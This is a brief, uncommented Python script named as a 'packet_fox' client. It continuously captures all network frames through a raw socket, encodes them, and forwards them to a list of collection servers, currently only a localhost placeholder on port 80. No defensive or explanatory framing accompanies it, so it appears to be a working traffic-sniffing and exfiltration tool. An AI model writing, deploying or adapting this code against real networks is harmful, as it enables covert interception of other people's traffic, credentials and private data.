import base64
import binascii
import socket

def packet_fox_client():
    while True:
        sniffer_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        packet = sniffer_socket.recv(65536)
        data = base64.b64encode(binascii.hexlify(packet).decode().encode())

        for server in ["127.0.0.1"]:
            my_socket = socket.socket()
            my_socket.connect((server, 80))
            my_socket.sendall(data)
            my_socket.close()

packet_fox_client()
